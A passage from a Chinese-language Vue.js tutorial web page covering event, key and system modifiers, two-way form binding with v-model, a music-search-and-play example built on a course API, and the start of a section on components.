punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="8-4-事件修饰符"><a href="#8-4-事件修饰符" class="headerlink" title="8.4 事件修饰符"></a>8.4 事件修饰符</h4><blockquote><p>当使用v-on进行事件绑定的时候，可以添加特定后缀，设置事件触发的特性</p></blockquote><h6 id="8-4-1-事件修饰符使用示例"><a href="#8-4-1-事件修饰符使用示例" class="headerlink" title="8.4.1 事件修饰符使用示例"></a>8.4.1 事件修饰符使用示例</h6><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">@click.prevent</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>事件函数<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>测试<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="8-4-2-事件修饰符"><a href="#8-4-2-事件修饰符" class="headerlink" title="8.4.2 事件修饰符"></a>8.4.2 事件修饰符</h6><p><strong>.prevent</strong>  消除元素的默认事件</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.baidu.com<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-success btn-xs<span class="token punctuation">"</span></span> <span class="token attr-name">@click.prevent</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>测试<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>        data<span class="token operator">:</span><span class="token punctuation">{</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        methods<span class="token operator">:</span><span class="token punctuation">{</span>            <span class="token function-variable function">test</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"---test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>.stop</strong> 阻止事件冒泡（阻止子标签向上冒泡）</p><p><strong>.self</strong> 设置只能自己触发事件（子标签不能触发）</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">width</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span> <span class="token property">height</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span> <span class="token property">background</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span> <span class="token attr-name">@click.self</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>method1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">width</span><span class="token punctuation">:</span> 150px<span class="token punctuation">;</span> <span class="token property">height</span><span class="token punctuation">:</span> 150px<span class="token punctuation">;</span> <span class="token property">background</span><span class="token punctuation">:</span> green<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>method2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">@click.stop</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>method3<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>测试<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>        data<span class="token operator">:</span><span class="token punctuation">{</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        methods<span class="token operator">:</span><span class="token punctuation">{</span>            <span class="token function-variable function">method1</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token function-variable function">method2</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token function-variable function">method3</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>.once</strong> 限定事件只触发一次</p><h6 id="8-4-3-按键修饰符"><a href="#8-4-3-按键修饰符" class="headerlink" title="8.4.3 按键修饰符"></a>8.4.3 按键修饰符</h6><blockquote><p>按键修饰符就是针对键盘事件的修饰符，限定哪个按键会触发事件</p></blockquote><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">@keyup.enter</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>method4<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>.enter</code></li><li><code>.tab</code></li><li><code>.delete</code> (捕获“删除”和“退格”键)</li><li><code>.esc</code></li><li><code>.space</code></li><li><code>.up</code></li><li><code>.down</code></li><li><code>.left</code></li><li><code>.right</code></li></ul><p>除了以上vue提供按钮的别名之外，我们还可以根据键盘为按键自定义别名</p><p><a href="https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/keyCode">键盘码</a></p><p><strong>示例</strong>：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>   <span class="token comment">&lt;!--2.使用自定义的按键别名aaa作为修饰符--&gt;</span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">@keyup.aaa</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>method4<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token comment">//1.为按键J定于别名为  aaa</span>    Vue<span class="token punctuation">.</span>config<span class="token punctuation">.</span>keyCodes<span class="token punctuation">.</span>aaa <span class="token operator">=</span><span class="token number">74</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>        data<span class="token operator">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>        methods<span class="token operator">:</span><span class="token punctuation">{</span>            <span class="token function-variable function">method4</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="8-4-3-系统修饰符"><a href="#8-4-3-系统修饰符" class="headerlink" title="8.4.3 系统修饰符"></a>8.4.3 系统修饰符</h6><blockquote><p>组合键</p></blockquote><p><strong>示例</strong>  ctrl+j触发事件</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">@keyup.ctrl.j</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>method4<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    Vue<span class="token punctuation">.</span>config<span class="token punctuation">.</span>keyCodes<span class="token punctuation">.</span>j <span class="token operator">=</span><span class="token number">74</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>        data<span class="token operator">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>        methods<span class="token operator">:</span><span class="token punctuation">{</span>            <span class="token function-variable function">method4</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>.ctrl</code></li><li><code>.alt</code></li><li><code>.shift</code></li><li><code>.meta</code> windows键</li></ul><h2 id="九、表单输入绑定"><a href="#九、表单输入绑定" class="headerlink" title="九、表单输入绑定"></a>九、表单输入绑定</h2><blockquote><p>表单输入绑定，即双向绑定：就是能够将vue实例的data数据渲染到表单输入视图（input\textarea\select），也能够将输入视图的数据同步更新到vue实例的data中</p></blockquote><pre class="line-numbers language-HTML" data-language="HTML"><code class="language-HTML">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;title&gt;&lt;/title&gt;&lt;link rel="stylesheet" href="css/bootstrap.css" /&gt;&lt;script type="text/javascript" src="js/jquery-3.4.1.min.js" &gt;&lt;/script&gt;&lt;script type="text/javascript" src="js/bootstrap.js" &gt;&lt;/script&gt;&lt;script type="text/javascript" src="js/vue.js" &gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="container"&gt;&lt;!--文本输入框、密码输入框--&gt;&lt;input type="text" v-model="text"/&gt;&lt;br/&gt;&lt;input type="password" v-model="pwd"/&gt;&lt;br/&gt;&lt;!--单选按钮--&gt;&lt;input type="radio" v-model="opt1" value="A"/&gt;A  3&lt;input type="radio" v-model="opt1" value="B"/&gt;B  4&lt;input type="radio" v-model="opt1" value="C"/&gt;C  5&lt;input type="radio" v-model="opt1" value="D"/&gt;D  6  &lt;br/&gt;&lt;!--复选框，绑定的是一个数组--&gt;&lt;input type="checkbox" v-model="opt2" value="篮球"/&gt;篮球 &lt;br/&gt;&lt;input type="checkbox" v-model="opt2" value="足球"/&gt;足球 &lt;br/&gt;&lt;input type="checkbox" v-model="opt2" value="羽毛球"/&gt;羽毛球 &lt;br/&gt;&lt;input type="checkbox" v-model="opt2" value="乒乓球"/&gt;乒乓球&lt;br/&gt;&lt;!--下拉菜单select：绑定一个字符串--&gt;&lt;select v-model="city"&gt;&lt;option value="BJ"&gt;北京&lt;/option&gt;&lt;option value="SH"&gt;上海&lt;/option&gt;&lt;option value="GZ"&gt;广州&lt;/option&gt;&lt;option value="SZ"&gt;深圳&lt;/option&gt;&lt;/select&gt;&lt;br/&gt;&lt;!--下拉菜单select：如果有multiple表示可多选，需要绑定一个数组--&gt;&lt;select v-model="cities" multiple&gt;&lt;option value="BJ"&gt;北京&lt;/option&gt;&lt;option value="SH"&gt;上海&lt;/option&gt;&lt;option value="GZ"&gt;广州&lt;/option&gt;&lt;option value="SZ"&gt;深圳&lt;/option&gt;&lt;/select&gt;&lt;br/&gt;&lt;button type="button" @click="doSearch"&gt;测试&lt;/button&gt;&lt;/div&gt;&lt;script type="text/javascript"&gt;var vm = new Vue({el:"#container",data:{text:"aaa",pwd:"111111",opt1:"C",opt2:["篮球","羽毛球"],city:"SZ",cities:["BJ","SZ"]},methods:{doSearch:function(){alert(vm.cities);}}});&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="十、vue使用案例"><a href="#十、vue使用案例" class="headerlink" title="十、vue使用案例"></a>十、vue使用案例</h2><h4 id="10-1-接口说明"><a href="#10-1-接口说明" class="headerlink" title="10.1 接口说明"></a>10.1 接口说明</h4><table><thead><tr><th>接口名称</th><th></th></tr></thead><tbody><tr><td>功能描述</td><td>根据关键字搜索音乐信息</td></tr><tr><td>请求URL</td><td><a href="http://47.96.11.185:9999/music/search">http://47.96.11.185:9999/music/search</a></td></tr><tr><td>请求方式</td><td>GET | POST</td></tr><tr><td>请求参数</td><td>s              string      [必须]      搜索关键字<br>limit       int            [可选]      返回的搜索结果的条数，默认为10<br>type        int            [可选]      搜索类型(1单曲    10歌单)，默认为1<br>offset      int            [可选]     搜索结果的偏移</td></tr><tr><td>返回结果</td><td><img src="imgs/1618910014977.png" alt="1618910014977"></td></tr></tbody></table><h4 id="10-2-如何部署jar文件"><a href="#10-2-如何部署jar文件" class="headerlink" title="10.2 如何部署jar文件"></a>10.2 如何部署jar文件</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">java -jar music-1.0.0.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="10-3-案例目标"><a href="#10-3-案例目标" class="headerlink" title="10.3 案例目标"></a>10.3 案例目标</h4><p>请大家根据以上接口实现搜索和列表显示功能</p><h4 id="10-4-案例实现"><a href="#10-4-案例实现" class="headerlink" title="10.4 案例实现"></a>10.4 案例实现</h4><h6 id="10-4-1-音乐搜索"><a href="#10-4-1-音乐搜索" class="headerlink" title="10.4.1 音乐搜索"></a>10.4.1 音乐搜索</h6><h6 id="10-4-2-音乐播放"><a href="#10-4-2-音乐播放" class="headerlink" title="10.4.2 音乐播放"></a>10.4.2 音乐播放</h6><ul><li><p>在music.html中定义音频播放器(定义在vue的容器之外)</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>audio</span> <span class="token attr-name">controls</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">width</span><span class="token punctuation">:</span>100%</span><span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>player<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>audio</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>给播放按钮绑定点击事件触发的函数doPlay</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-success btn-xs<span class="token punctuation">"</span></span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>doPlay<span class="token punctuation">"</span></span> <span class="token attr-name">:data-mid</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>song.id<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>播放<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在doPlay中执行播放</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">&gt;</span>    <span class="token keyword">var</span> player <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"player"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>    data<span class="token operator">:</span><span class="token punctuation">{</span>        keyword<span class="token operator">:</span><span class="token string">"张韶涵"</span><span class="token punctuation">,</span>        songs<span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        currentid<span class="token operator">:</span><span class="token number">0</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    methods<span class="token operator">:</span><span class="token punctuation">{</span>        <span class="token function-variable function">doSearch</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>vm<span class="token punctuation">.</span>keyword<span class="token punctuation">)</span><span class="token punctuation">;</span>            $<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"http://localhost:9999/music/search"</span><span class="token punctuation">,</span><span class="token punctuation">{</span>s<span class="token operator">:</span>vm<span class="token punctuation">.</span>keyword<span class="token punctuation">,</span>limit<span class="token operator">:</span><span class="token number">15</span><span class="token punctuation">,</span>offset<span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token comment">//获取此关键词搜索的总记录数</span>                    <span class="token keyword">var</span> count <span class="token operator">=</span> res<span class="token punctuation">.</span>result<span class="token punctuation">.</span>songCount<span class="token punctuation">;</span>                    <span class="token comment">//获取音乐集合</span>                    <span class="token keyword">var</span> arr <span class="token operator">=</span> res<span class="token punctuation">.</span>result<span class="token punctuation">.</span>songs<span class="token punctuation">;</span>                    vm<span class="token punctuation">.</span>songs <span class="token operator">=</span> arr<span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                    vm<span class="token punctuation">.</span>songs <span class="token operator">=</span> data<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">"json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token function-variable function">doPlay</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            vm<span class="token punctuation">.</span>currentid <span class="token operator">=</span> event<span class="token punctuation">.</span>srcElement<span class="token punctuation">.</span>dataset<span class="token punctuation">.</span>mid<span class="token punctuation">;</span>            <span class="token comment">//网易云音乐播放地址： http://music.163.com/song/media/outer/url?id=songId</span>            player<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"http://music.163.com/song/media/outer/url?id="</span><span class="token operator">+</span>vm<span class="token punctuation">.</span>currentid<span class="token punctuation">;</span>            player<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h6 id="10-4-3-播放暂停切换"><a href="#10-4-3-播放暂停切换" class="headerlink" title="10.4.3 播放暂停切换"></a>10.4.3 播放暂停切换</h6><h2 id="十一、组件"><a href="#十一、组件" class="headerlink" title="十一、组件"></a>十一、组件</h2><h4 id="11-1-组件介绍及示例"><a href="#11-1-组件介绍及示例" class="headerlink" title="11.1 组件介绍及示例"></a>11.1 组件介绍及示例</h4><blockquote><p>组件，就是将通用的HTML模块进行封装——可复用</p></blockquote><h6 id="11-1-1-组件注册"><a href="#11-1-1-组件注册" class="headerlink" title="11.1.1 组件注册"></a>11.1.1 组件注册</h6><blockquote><p>将通用的HTML模块封装注册到vue中</p></blockquote><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Vue<span class="token punctuation">.</span><span class="token function">component</span><span class="token punctuation">(</span><span class="token string">"header-bar"</span><span class="token punctuation">,</span><span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h6 id="11-1-2-组件引用"><a href="#11-1-2-组件引用" class="headerlink" title="11.1.2 组件引用"></a>11.1.2 组件引用</h6><ul><li>定义组件需要依赖vue.js，在引用自定义组件的js文件之前要先引用vue.js</li><li>组件的引用必须在vue实例el指定的容器中</li></ul><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token 